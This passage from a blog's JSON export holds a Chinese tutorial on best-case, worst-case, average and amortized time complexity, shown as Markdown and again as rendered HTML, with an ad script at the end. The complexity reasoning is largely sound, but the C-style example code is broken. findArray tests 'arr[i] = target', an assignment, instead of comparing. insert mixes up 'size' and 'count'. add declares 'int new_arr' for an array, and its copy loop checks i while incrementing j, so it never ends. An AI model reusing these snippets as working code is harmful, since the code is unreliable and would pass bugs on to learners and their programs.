= len*2;\n  }\n  // 添加到数组中\n  arr[i] = element;\n  ++i;\n}\n```\n\n**分析：**在最理想情况下，数组中有空闲空间，可以直接添加到数组中，时间复杂度为O(1)；最坏情况下，数组中没有空闲空间，先进行一次扩容操作，在进行遍历给新数组赋值，时间复杂度为O(n)，所以最坏时间复杂度为O(n)。\n\n平均时间复杂度，可以分为有空闲空间和没有空闲空间两种，有空间空间有n中情况，所以每种情况出现的概率为$\\frac{1}{n+1}$，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +....+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。\n\n均摊时间复杂度，可以看出本例是符合均摊时间复杂度的场景的，在一次O(n)时间复杂度操作后都会跟n-1次O(1)时间复杂度操作，所以将O(n)时间复杂度的操作均摊到n-1次O(1)时间复杂度操作上，最终均摊时间复杂度为O(1)。\n\n\n\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-最好、最坏、平均、均摊时间复杂度.md","raw":"---\ntitle: 算法-最好、最坏、平均、均摊时间复杂度\ndate: 2018-09-09 00:18:36\ntags: ['算法','复杂度分析']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n前面我们讲过复杂度的大O表示法和几个分析技巧，还举了一些复杂度分析的例子，掌握了这些内容，对于复杂度分析这个知识点，已经达到及格线了。\n\n这篇会着重讲一下复杂度分析的四个复杂度分析方面的知识：\n<font color=red>**最好时间情况复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度**</font>。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 最好、最坏时间复杂度\n{% endnote %}\n</div> \n\n我们先用学过的知识试着分析以下代码的时间复杂度：\n\n```C\nint findArray(int[] arr, int n, int target){\n  int i = 0;\n  int pos = -1;\n\n  for(i; i<n; i++){\n    if(arr[i] = target){\n      pos = i;\n    }\n  }\n  return pos;\n}\n```\n\n上面代码实现的功能是在一个无序数组中，查找变量target的位置，如果找不到就返回-1，按照前面的分析方法，该段代码的时间复杂度为O(n)。\n\n但是我们在数组中查找一个数据，并不需要每次都把整个数组都遍历一遍，优化一下这段代码：\n\n```C\nint findArray(int[] arr, int n, int target){\n  int i = 0;\n  int pos = -1;\n\n  for(i; i<n; i++){\n    if(arr[i] = target){\n      pos = i;\n      break;\n    }\n  }\n  return pos;\n}\n```\n但是这时候问题来了，优化完之后，时间复杂度还是O(n)吗？\n\n因为要查找的变量target可能出现在数组的任何位置，如果要查找的target刚好出现在数组的开始位置，那么就不需要遍历剩余的数据，此时时间复杂度为O(1)。但是如果数组中不存在变量target，或者在最后一位，那我们就需要把整个数组都遍历一遍，时间复杂度就成了O(n)，所以这段代码在不同情况下时间复杂度是不同的。\n\n为了表示代码在不同情况下的时间复杂度，我们需要引入三个概念：**最好情况时间复杂度、最坏情况复杂度、平均时间复杂度**。\n\n顾名思义，最好情况时间复杂度就是，在最理想情况下，执行这段代码的时间复杂度。如上例中，在最理想情况下，查找的变量target刚好在第一个，这时候对应的时间复杂度就是最好情况时间复杂度。\n\n同理，最坏情况时间复杂度就是，在最糟糕的情况下，执行这段代码的时间复杂度，上例中，如果数组中没有要查找的变量target，我们需要把整个数组遍历一遍，所以最坏情况下对应的时间复杂度就是最坏情况复杂度。\n<div style=\"text-align: center;\">\n{% note success %} \n### 平均时间复杂度\n{% endnote %}\n</div> \n我们都知道，最好情况时间复杂度和最坏情况时间复杂度对应的都是极端情况下的代码复杂度，发生的概率并不大。为了更好的表示平均情况下的时间复杂度，我们引入一个概念：**平均情况时间复杂度，简称平均时间复杂度**。\n\n平均时间复杂度又该怎么分析呢？我们还是借助上面的例子。\n\n要查找的变量target在数组中的位置，有n+1中情况： 在数组0 ~ n-1位置 n种情况和不在数组中1个情况。我们把每种情况下，需要遍历的元素个数累加起来，然后在除以n+1，就可以得到需要遍历的元素个数的平均值，即：\n\n$$ \\frac{1+2+3+...+n+n}{n+1} = \\frac{n(n + 3)}{2(n + 1)} $$\n\n我们知道，时间复杂度大O标记法中，可以省略掉系数、低阶、常量，所以上面的时间复杂度为O(n)。\n\n这个结论虽然是正确的，但是计算过程稍微有点问题。我们刚讲的这n+1中情况，出现的概率并不一样。下面结合概率论的知识分析一下。\n\n我们知道，要查找的变量x，要么在数组中，要么不再数组中，我们假设这两个概率分布为$\\frac{1}{2}$。\n\n不在数组中时，时间复杂度为: <font color=red>$n\\times\\frac{1}{2}$</font>; 在数组中时，因为数组大小为n，出现在任何一个位置的可能性都是一样的，所以每个位置的概率就是:<font color=red>$\\frac{1}{2n}$</font>, 因此在数组中时的时间复杂度为：<font color=red>$(1+2+3+...+n)\\times\\frac{1}{2n} $</font>。\n\n\n那平均时间复杂度就是：<font color=red>$(1+2+3+...+n)\\times\\frac{1}{2n} + n\\times\\frac{1}{2} = \\frac{3n+1}{4} = O(n)$</font>。\n\n这个值就是概率论中的加权平均值，也叫做期望值，所以平均时间复杂度也叫做**加权平均时间复杂度**或者**期望时间复杂度**。\n\n实际上，在大多情况下我们并不需要区分最好、最坏、平均时间复杂度三种情况，很多时候我们只用一个复杂度就可以满足需求了。只有同一代码在不同的情况下，时间复杂度有量级的差距，我们才会使用三种复杂度表示法来区分。\n<div style=\"text-align: center;\">\n{% note success %} \n### 均摊时间复杂度\n{% endnote %}\n</div> \n目前为止，我们应该已经掌握了算法复杂度分析的大部分内容了，下面来认识一个更高级的概念：**均摊时间复杂度**，以及它对应的分析方法**摊还分析**。\n\n均摊时间复杂度听起来跟平均时间复杂度有点像，对于初学者来说，这两个概念很容易弄混。前面说过，大部分情况下不需要区分最好、最坏、平均时间复杂度，只有某些特殊情况才需要平均时间复杂度，而均摊时间复杂度比它的应用场景比它更特殊、更有限。\n\n还是以一个例子来说明(别太在意例子，只是为了说明)：\n\n```C\nint[] arr = new int[n];\nint size = 0；\n\nvoid insert(int val){\n  // 如果数组满了\n  if(count == arr.length){\n    int sum = 0;\n    for(int i=0; i<arr.length;i++){\n      sum = sum + arr[i];\n    }\n    arr[0] = sum;\n    count = 1;\n  }\n  // 数组赋值\n  arr[count] = val;\n  ++count;\n}\n```\n先简单解释一下这段代码的功能，这段代码实现了一个往数组中插入数据的功能，如果数组有空闲空间，直接插入即可。如果数组满了，将数组中的数据求和，清空数组，将求和之后的数据放入数组的第一个位置，然后再将新的数据插入。\n\n那这段代码的时间复杂度是多少呢？我们可以先利用上面讲的三种分析方法来分析一下。\n\n最理想情况下，数组有空闲空间，直接插入数据就可以，所以最好时间复杂度为O(1)；最坏情况下，数组中没有空闲空间了，我们需要先进行一次数组遍历求和，在做数据插入，所以最坏情况时间复杂度为O(n)；平均情况时间复杂度，我们还是用概率论的方法来分析，假设数组长度为n，根据插入位置不同，可以分为n种情况，每种情况的时间复杂度为O(1)，另外还有一种特殊情况，就是数组没有空闲时间时，时间复杂度为O(n)，而且这n+1中情况出现的概率是一样的，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +....+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。\n\n我们来比较一下这个例子中insert函数和上面findArray的不同。首先，findArray在极端情况下，复杂度才为O(1)，大部分情况都为O(n)，而insert函数大部分情况时间复杂度都为O(1)，只有特殊情况时间复杂度才为O(n)，这是第一个区别。第二个不同的地方，对于insert函数来说，O(1)和O(n)的时间复杂度出现的频率是非常有规律的，而且有一定的时序关系，一般都是一个O(n)插入之后，跟n-1个O(1)的插入操作，循环往复。\n\n针对这样一种情况，我们并不需要像平均复杂度分析那样，计算所有输入情况和发生的概率，计算加权平均值。 我们引入一种更加简单的分析方法：**摊还分析法**，通过摊还分析得到的时间复杂度我们起了一个名字叫：**摊还时间复杂度**。\n\n那么究竟如何使用摊还分析法来分析算法的均摊时间复杂度呢？\n\n我们还是以这个insert函数为例，每一次O(n)的插入操作，后面都会跟n-1次O(1)插入操作，所以我们把耗时最多的操作均摊到n-1次耗时少的操作上，均摊下来，这一组连续操作的均摊时间复杂度就为O(1)，这就是均摊分析法的大致思路。\n\n均摊时间复杂度和摊还分析应用场景比较特殊，所以不会经常用到，这里简单总结一下他们的应用场景。\n\n对一个数据结构进行一组连续操作中，大部分情况下时间复杂度都很低，只有个别情况下时间复杂度比较高，而且这些操作之间存在前后连贯的时序关系，这个时候，我们就可以将这一组操作放在一块分析，看看是否能将时间复杂度高的操作，均摊到其他时间复杂度低的操作上。在一般的能运用均摊时间复杂度的场景中，均摊时间复杂度是等于最好时间复杂度的。\n\n\n### 思考题：\n\n根据今天学习的几个复杂度分析的方法，来分析一下下面这个add()函数的时间复杂度。\n\n```C\nint[] arr = new int[10];\nint len = 10;\nint i=0;\n\nvoid add(int element){\n  // 数组空间满了\n  if(i>=len){\n    // 数组扩容\n    int new_arr = new int[len*2];\n    // 把数组拷贝到新数组\n    for(int j=0; i<len; j++){\n      new_arr[j] = arr[j];\n    }\n    arr = new_arr;\n    len = len*2;\n  }\n  // 添加到数组中\n  arr[i] = element;\n  ++i;\n}\n```\n\n**分析：**在最理想情况下，数组中有空闲空间，可以直接添加到数组中，时间复杂度为O(1)；最坏情况下，数组中没有空闲空间，先进行一次扩容操作，在进行遍历给新数组赋值，时间复杂度为O(n)，所以最坏时间复杂度为O(n)。\n\n平均时间复杂度，可以分为有空闲空间和没有空闲空间两种，有空间空间有n中情况，所以每种情况出现的概率为$\\frac{1}{n+1}$，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +....+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。\n\n均摊时间复杂度，可以看出本例是符合均摊时间复杂度的场景的，在一次O(n)时间复杂度操作后都会跟n-1次O(1)时间复杂度操作，所以将O(n)时间复杂度的操作均摊到n-1次O(1)时间复杂度操作上，最终均摊时间复杂度为O(1)。\n\n\n\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-最好、最坏、平均、均摊时间复杂度","published":1,"updated":"2019-06-26T03:52:03.526Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2mr004wo25tasllx9ca","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>前面我们讲过复杂度的大O表示法和几个分析技巧，还举了一些复杂度分析的例子，掌握了这些内容，对于复杂度分析这个知识点，已经达到及格线了。</p>\n<p>这篇会着重讲一下复杂度分析的四个复杂度分析方面的知识：</p>\n<p><font color=\"red\"><strong>最好时间情况复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度</strong></font>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"最好、最坏时间复杂度\"><a href=\"#最好、最坏时间复杂度\" class=\"headerlink\" title=\"最好、最坏时间复杂度\"></a>最好、最坏时间复杂度</h3></div><br></div> \n\n<p>我们先用学过的知识试着分析以下代码的时间复杂度：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">findArray</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> target)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> pos = <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>(i; i&lt;n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(arr[i] = target)&#123;</span><br><span class=\"line\">      pos = i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> pos;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面代码实现的功能是在一个无序数组中，查找变量target的位置，如果找不到就返回-1，按照前面的分析方法，该段代码的时间复杂度为O(n)。</p>\n<p>但是我们在数组中查找一个数据，并不需要每次都把整个数组都遍历一遍，优化一下这段代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">findArray</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> target)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> pos = <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>(i; i&lt;n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(arr[i] = target)&#123;</span><br><span class=\"line\">      pos = i;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> pos;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但是这时候问题来了，优化完之后，时间复杂度还是O(n)吗？</p>\n<p>因为要查找的变量target可能出现在数组的任何位置，如果要查找的target刚好出现在数组的开始位置，那么就不需要遍历剩余的数据，此时时间复杂度为O(1)。但是如果数组中不存在变量target，或者在最后一位，那我们就需要把整个数组都遍历一遍，时间复杂度就成了O(n)，所以这段代码在不同情况下时间复杂度是不同的。</p>\n<p>为了表示代码在不同情况下的时间复杂度，我们需要引入三个概念：<strong>最好情况时间复杂度、最坏情况复杂度、平均时间复杂度</strong>。</p>\n<p>顾名思义，最好情况时间复杂度就是，在最理想情况下，执行这段代码的时间复杂度。如上例中，在最理想情况下，查找的变量target刚好在第一个，这时候对应的时间复杂度就是最好情况时间复杂度。</p>\n<p>同理，最坏情况时间复杂度就是，在最糟糕的情况下，执行这段代码的时间复杂度，上例中，如果数组中没有要查找的变量target，我们需要把整个数组遍历一遍，所以最坏情况下对应的时间复杂度就是最坏情况复杂度。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"平均时间复杂度\"><a href=\"#平均时间复杂度\" class=\"headerlink\" title=\"平均时间复杂度\"></a>平均时间复杂度</h3></div><br></div><br>我们都知道，最好情况时间复杂度和最坏情况时间复杂度对应的都是极端情况下的代码复杂度，发生的概率并不大。为了更好的表示平均情况下的时间复杂度，我们引入一个概念：<strong>平均情况时间复杂度，简称平均时间复杂度</strong>。</p>\n<p>平均时间复杂度又该怎么分析呢？我们还是借助上面的例子。</p>\n<p>要查找的变量target在数组中的位置，有n+1中情况： 在数组0 ~ n-1位置 n种情况和不在数组中1个情况。我们把每种情况下，需要遍历的元素个数累加起来，然后在除以n+1，就可以得到需要遍历的元素个数的平均值，即：</p>\n<p>$$ \\frac{1+2+3+…+n+n}{n+1} = \\frac{n(n + 3)}{2(n + 1)} $$</p>\n<p>我们知道，时间复杂度大O标记法中，可以省略掉系数、低阶、常量，所以上面的时间复杂度为O(n)。</p>\n<p>这个结论虽然是正确的，但是计算过程稍微有点问题。我们刚讲的这n+1中情况，出现的概率并不一样。下面结合概率论的知识分析一下。</p>\n<p>我们知道，要查找的变量x，要么在数组中，要么不再数组中，我们假设这两个概率分布为$\\frac{1}{2}$。</p>\n<p>不在数组中时，时间复杂度为: <font color=\"red\">$n\\times\\frac{1}{2}$</font>; 在数组中时，因为数组大小为n，出现在任何一个位置的可能性都是一样的，所以每个位置的概率就是:<font color=\"red\">$\\frac{1}{2n}$</font>, 因此在数组中时的时间复杂度为：<font color=\"red\">$(1+2+3+…+n)\\times\\frac{1}{2n} $</font>。</p>\n<p>那平均时间复杂度就是：<font color=\"red\">$(1+2+3+…+n)\\times\\frac{1}{2n} + n\\times\\frac{1}{2} = \\frac{3n+1}{4} = O(n)$</font>。</p>\n<p>这个值就是概率论中的加权平均值，也叫做期望值，所以平均时间复杂度也叫做<strong>加权平均时间复杂度</strong>或者<strong>期望时间复杂度</strong>。</p>\n<p>实际上，在大多情况下我们并不需要区分最好、最坏、平均时间复杂度三种情况，很多时候我们只用一个复杂度就可以满足需求了。只有同一代码在不同的情况下，时间复杂度有量级的差距，我们才会使用三种复杂度表示法来区分。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"均摊时间复杂度\"><a href=\"#均摊时间复杂度\" class=\"headerlink\" title=\"均摊时间复杂度\"></a>均摊时间复杂度</h3></div><br></div><br>目前为止，我们应该已经掌握了算法复杂度分析的大部分内容了，下面来认识一个更高级的概念：<strong>均摊时间复杂度</strong>，以及它对应的分析方法<strong>摊还分析</strong>。</p>\n<p>均摊时间复杂度听起来跟平均时间复杂度有点像，对于初学者来说，这两个概念很容易弄混。前面说过，大部分情况下不需要区分最好、最坏、平均时间复杂度，只有某些特殊情况才需要平均时间复杂度，而均摊时间复杂度比它的应用场景比它更特殊、更有限。</p>\n<p>还是以一个例子来说明(别太在意例子，只是为了说明)：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>[] arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[n];</span><br><span class=\"line\"><span class=\"keyword\">int</span> size = <span class=\"number\">0</span>；</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> insert(<span class=\"keyword\">int</span> val)&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 如果数组满了</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(count == arr.length)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>; i&lt;arr.length;i++)&#123;</span><br><span class=\"line\">      sum = sum + arr[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr[<span class=\"number\">0</span>] = sum;</span><br><span class=\"line\">    count = <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 数组赋值</span></span><br><span class=\"line\">  arr[count] = val;</span><br><span class=\"line\">  ++count;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>先简单解释一下这段代码的功能，这段代码实现了一个往数组中插入数据的功能，如果数组有空闲空间，直接插入即可。如果数组满了，将数组中的数据求和，清空数组，将求和之后的数据放入数组的第一个位置，然后再将新的数据插入。</p>\n<p>那这段代码的时间复杂度是多少呢？我们可以先利用上面讲的三种分析方法来分析一下。</p>\n<p>最理想情况下，数组有空闲空间，直接插入数据就可以，所以最好时间复杂度为O(1)；最坏情况下，数组中没有空闲空间了，我们需要先进行一次数组遍历求和，在做数据插入，所以最坏情况时间复杂度为O(n)；平均情况时间复杂度，我们还是用概率论的方法来分析，假设数组长度为n，根据插入位置不同，可以分为n种情况，每种情况的时间复杂度为O(1)，另外还有一种特殊情况，就是数组没有空闲时间时，时间复杂度为O(n)，而且这n+1中情况出现的概率是一样的，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +….+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。</p>\n<p>我们来比较一下这个例子中insert函数和上面findArray的不同。首先，findArray在极端情况下，复杂度才为O(1)，大部分情况都为O(n)，而insert函数大部分情况时间复杂度都为O(1)，只有特殊情况时间复杂度才为O(n)，这是第一个区别。第二个不同的地方，对于insert函数来说，O(1)和O(n)的时间复杂度出现的频率是非常有规律的，而且有一定的时序关系，一般都是一个O(n)插入之后，跟n-1个O(1)的插入操作，循环往复。</p>\n<p>针对这样一种情况，我们并不需要像平均复杂度分析那样，计算所有输入情况和发生的概率，计算加权平均值。 我们引入一种更加简单的分析方法：<strong>摊还分析法</strong>，通过摊还分析得到的时间复杂度我们起了一个名字叫：<strong>摊还时间复杂度</strong>。</p>\n<p>那么究竟如何使用摊还分析法来分析算法的均摊时间复杂度呢？</p>\n<p>我们还是以这个insert函数为例，每一次O(n)的插入操作，后面都会跟n-1次O(1)插入操作，所以我们把耗时最多的操作均摊到n-1次耗时少的操作上，均摊下来，这一组连续操作的均摊时间复杂度就为O(1)，这就是均摊分析法的大致思路。</p>\n<p>均摊时间复杂度和摊还分析应用场景比较特殊，所以不会经常用到，这里简单总结一下他们的应用场景。</p>\n<p>对一个数据结构进行一组连续操作中，大部分情况下时间复杂度都很低，只有个别情况下时间复杂度比较高，而且这些操作之间存在前后连贯的时序关系，这个时候，我们就可以将这一组操作放在一块分析，看看是否能将时间复杂度高的操作，均摊到其他时间复杂度低的操作上。在一般的能运用均摊时间复杂度的场景中，均摊时间复杂度是等于最好时间复杂度的。</p>\n<h3 id=\"思考题：\"><a href=\"#思考题：\" class=\"headerlink\" title=\"思考题：\"></a>思考题：</h3><p>根据今天学习的几个复杂度分析的方法，来分析一下下面这个add()函数的时间复杂度。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>[] arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> len = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"keyword\">int</span> element)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 数组空间满了</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(i&gt;=len)&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 数组扩容</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> new_arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[len*<span class=\"number\">2</span>];</span><br><span class=\"line\">    <span class=\"comment\">// 把数组拷贝到新数组</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>; i&lt;len; j++)&#123;</span><br><span class=\"line\">      new_arr[j] = arr[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr = new_arr;</span><br><span class=\"line\">    len = len*<span class=\"number\">2</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 添加到数组中</span></span><br><span class=\"line\">  arr[i] = element;</span><br><span class=\"line\">  ++i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>分析：</strong>在最理想情况下，数组中有空闲空间，可以直接添加到数组中，时间复杂度为O(1)；最坏情况下，数组中没有空闲空间，先进行一次扩容操作，在进行遍历给新数组赋值，时间复杂度为O(n)，所以最坏时间复杂度为O(n)。</p>\n<p>平均时间复杂度，可以分为有空闲空间和没有空闲空间两种，有空间空间有n中情况，所以每种情况出现的概率为$\\frac{1}{n+1}$，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +….+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。</p>\n<p>均摊时间复杂度，可以看出本例是符合均摊时间复杂度的场景的，在一次O(n)时间复杂度操作后都会跟n-1次O(1)时间复杂度操作，所以将O(n)时间复杂度的操作均摊到n-1次O(1)时间复杂度操作上，最终均摊时间复杂度为O(1)。</p>\n<p><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>前面我们讲过复杂度的大O表示法和几个分析技巧，还举了一些复杂度分析的例子，掌握了这些内容，对于复杂度分析这个知识点，已经达到及格线了。</p>\n<p>这篇会着重讲一下复杂度分析的四个复杂度分析方面的知识：</p>\n<p><font color=\"red\"><strong>最好时间情况复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度</strong></font>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"最好、最坏时间复杂度\"><a href=\"#最好、最坏时间复杂度\" class=\"headerlink\" title=\"最好、最坏时间复杂度\"></a>最好、最坏时间复杂度</h3></div><br></div> \n\n<p>我们先用学过的知识试着分析以下代码的时间复杂度：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">findArray</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> target)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> pos = <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>(i; i&lt;n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(arr[i] = target)&#123;</span><br><span class=\"line\">      pos = i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> pos;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面代码实现的功能是在一个无序数组中，查找变量target的位置，如果找不到就返回-1，按照前面的分析方法，该段代码的时间复杂度为O(n)。</p>\n<p>但是我们在数组中查找一个数据，并不需要每次都把整个数组都遍历一遍，优化一下这段代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span 